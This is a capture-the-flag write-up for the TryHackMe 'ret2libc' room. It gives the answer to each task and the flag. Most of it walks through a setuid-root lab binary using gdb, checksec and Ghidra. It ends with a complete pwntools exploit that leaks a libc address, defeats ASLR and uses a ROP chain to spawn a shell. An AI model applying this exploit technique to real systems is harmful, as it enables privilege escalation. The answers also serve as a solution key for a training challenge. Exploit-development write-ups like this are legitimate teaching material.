# ret2libc

{% embed url="https://tryhackme.com/room/ret2libc" %}
https://tryhackme.com/room/ret2libc
{% endembed %}

## Task 2 Introduction

#### What is the name of the function which is essential for ret2libc attack?

{% hint style="success" %}
`system`
{% endhint %}

## Task 4 Review of the binary

```bash
ssh andy@10.10.194.254
ls -lA
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 18-16-23.png>)

#### What are the permissions of the exploit\_me binary?

{% hint style="success" %}
`-rwsrwxr-x 1 root root`
{% endhint %}

```bash
file exploit_me
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 18-17-36.png>)

```bash
./exploit_me
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 18-19-46.png>)

```bash
python3 -c 'print("A" * 30)' | ./exploit_me
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 18-20-58.png>)

#### What is the overflow offset that we found in gdb?

```bash
 gdb -q ./exploit_me
 > pattern create
 > run
 > pattern search $rsp
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 18-34-25.png>)

{% hint style="success" %}
`18`
{% endhint %}

#### At which address will exploit\_me binary start?

```bash
checksec ./exploit_me
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 18-36-08.png>)

{% hint style="success" %}
`0x400000`
{% endhint %}

## Task 5 ASLR & GOT

### ASLR

```bash
sysctl kernel.randomize_va_space
```

![](<../../.gitbook/assets/Screenshot from 2022-05-13 18-40-11.png>)

### Global Offset Table (GOT)

After these functions are called for the first time, their real addresses are "saved" in the section of the program called .got.plt.

#### What is the name of the section of the binary which is important for our leak?

{% hint style="success" %}
`.got.plt`
{% endhint %}

## Task 6 Examining in the Ghidra

![](<../../.gitbook/assets/Screenshot from 2022-05-14 07-23-14.png>)

![](<../../.gitbook/assets/Screenshot from 2022-05-14 07-24-57.png>)

#### What is the name of the function that is under gets in .got.plt?

{% hint style="success" %}
`setuid`
{% endhint %}

## Task 7 Creating the exploit

```python
from pwn import *

context.binary = binary = './exploit_me'
elf = ELF(binary)
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

padding = b'A' * 18
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

p = process()
p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\0'))
p.recvline()

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
p.recvline()
p.interactive()
```

#### What is the flag?

![](<../../.gitbook/assets/Screenshot from 2022-05-14 07-51-20.png>)

{% hint style="success" %}
`thm{dGhlIG1vc3QgcmFuZG9tIHZhbHVlIHlvdSBjb3VsZCBldmVyIGd1ZXNz}`
{% endhint %}
